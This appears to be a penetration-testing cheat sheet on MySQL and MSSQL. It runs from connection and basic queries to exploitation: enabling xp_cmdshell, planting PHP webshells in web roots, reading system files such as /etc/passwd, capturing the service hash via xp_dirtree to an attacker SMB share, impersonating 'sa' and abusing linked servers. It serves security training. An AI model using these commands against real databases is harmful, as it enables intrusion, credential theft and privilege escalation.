# SQL Databases 

**MySQL** and **Microsoft SQL Server** (**MSSQL**) are relational database management systems that store data in tables, columns, and rows. By default, MSSQL uses port **TCP/1433**, and MySQL uses **TCP/3306**.
```console
zero@pio$ nmap -Pn -sVC -p 1433,3306 <TARGET>
```

MSSQL supports two authentication modes, which means that users can be created in Windows or the SQL Server:

| **Authentication Type**   | **Description**    |
|--------------- | --------------- |
| Windows authentication mode | This is the default, often referred to as integrated security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. |
| Mixed mode | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server. |

MySQL also supports different authentication methods, such as username and password, as well as Windows authentication (a plugin is required). 

MySQL default system schemas/databases:

| **Schema/Database**   | **Description**    |
|--------------- | --------------- |
| `mysql` | is the system database that contains tables that store information required by the MySQL server |
| `information_schema` | provides access to database metadata |
| `performance_schema` | is a feature for monitoring MySQL Server execution at a low level
| `sys` | a set of objects that helps DBAs and developers interpret data collected by the Performance Schema |

MSSQL default system schemas/databases:

| **Schema/Database**   | **Description**    |
|--------------- | --------------- |
| `master` | keeps the information for an instance of SQL Server |
| `msdb` | used by SQL Server Agent |
| `model` | a template database copied for each new database |
| `resource` | a read-only database that keeps system objects visible in every database on the server in sys schema |
| `tempdb` | keeps temporary objects for SQL queries |


## Connection 

To perform a connection in Linux:
```console
zero@pio$ mysql -u <USER> -p<PASSWORD> -h <TARGET>
```

In Windows:
```console
C:\zeropio> sqlcmd -S SRVMSSQL -U <USER> -P '<PASSWORD>' -y 30 -Y 30
```

> When we authenticate to MSSQL using sqlcmd we can use the parameters `-y` and `-Y` for better looking output. Keep in mind it may affect performance.
{: .prompt-alert}

If we are targetting MSSQL from Linux, we can use sqsh as an alternative to sqlcmd:
```console
zero@pio$ sqsh -S <TARGET> -U <USER> -P '<PASSWORD>' -h
```

> When we authenticate to MSSQL using sqsh we can use the parameters `-h` to disable headers and footers for a cleaner look.
{: .prompt-tip}

When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`:
```console
zero@pio$ sqsh -S <TARGET> -U .\\<USER> -P '<PASSWORD>' -h
```

## Syntax 

### Show Databases

```console
mysql> SHOW DATABASES;
```

If we use sqlcmd, we will need to use `GO` after our query to execute the SQL syntax:
```console
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```

### Select a Database 

```console
mysql> USE database;
```

```console
1> USE database
2> GO
```

### Show Tables 

```console
mysql> SHOW TABLES;
```

```console
1> SELECT table_name FROM database.INFORMATION_SCHEMA.TABLES
2> GO
```

### Select all Data from Table "users"

```console
mysql> SELECT * FROM users;
```

```console
1> SELECT * FROM users
2> go
```

## Explotation 

### XP\_CMDSHELL

MSSQL has a extended stored procedures called `xp_cmdshell` which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:
-  is a powerful feature and disabled by default, can be enabled and disabled by using the Policy-Based Management or by executing `sp_configure`
- operates synchronously, control is not returned to the caller until the command-shell command is completed

To execute commands using SQL syntax on MSSQL, use:
```console
1> xp_cmdshell 'whoami'
2> GO
```

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

### Write Local Files 

MySQL does not have a stored procedure like `xp_cmdshell`, but we can archive command execution if we write to a location in the file system that can execute our commands, using `SELECT INTO OUTFILE` in the webserver directory:
```console
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

In MySQL, a global system variable `secure_file_priv` limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT â€¦ INTO OUTFILE` statements and the `LOAD_FILE()` function. These operations are permitted only to users who have the **FILE** privilege. `secure_file_priv` may be set as follows:
- If **empty**, the variable has no effect, which is not a secure setting.
- If set to the **name of a directory**, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to **NULL**, the server disables import and export operations.

```console
mysql> show variables like "secure_file_priv";
```

To write files using MSSQL, we need to enable **Ole Automation Procedures**, which requires admin privileges, and then execute some stored procedures to create the file. To enable it:
```console
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

Then to create a file:
```console
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### Read Local Files 

By default, MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
```console
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

As we previously mentioned, by default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:
```console
mysql> select LOAD_FILE("/etc/passwd");
```

### Capture MSSQL Service Hash 

To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries:

- **XP_DIRTREE** Hash Stealing

```console
1> EXEC master..xp_dirtree '\\<OUR IP>\share\'
2> GO
```

- **XP_SUBDIRS** Hash Stealing

```console
1> EXEC master..xp_subdirs '\\<OUR IP>\share\'
2> GO
```

With the Responder or Impacket:
```console
zero@pio$ sudo responder -I tun0 

...

zero@pio$  sudo impacket-smbserver share ./ -smb2support

...
```

After getting the password, crack it with **hashcat mode 5600**.

### Impersonate Existing Users with MSSQL 

SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:
```console
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:
```console
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

If we get a value `0` we do not have the sysadmin role, but we can impersonate the **sa** user. To impersonate a user, we can use the Transact-SQL statement **EXECUTE AS LOGIN** and set it to the user we want to impersonate:
```console
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

If we get a value `1` we have impersonated the user **sa** successfully.

### Communicate with Other Databases with MSSQL 

MSSQL has a configuration option called **linked servers**. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle. Identify linked Servers in MSSQL:
```console
1> SELECT srvname, isremote FROM sysservers
2> GO
```

In the **isrmeote** column, a `1` means is a remote server, and `0` is a linked server. Next, we can attempt to identify the user used for the connection and its privileges. The EXECUTE statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets `[ ]`:
```console
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<TARGET>]
2> GO
```
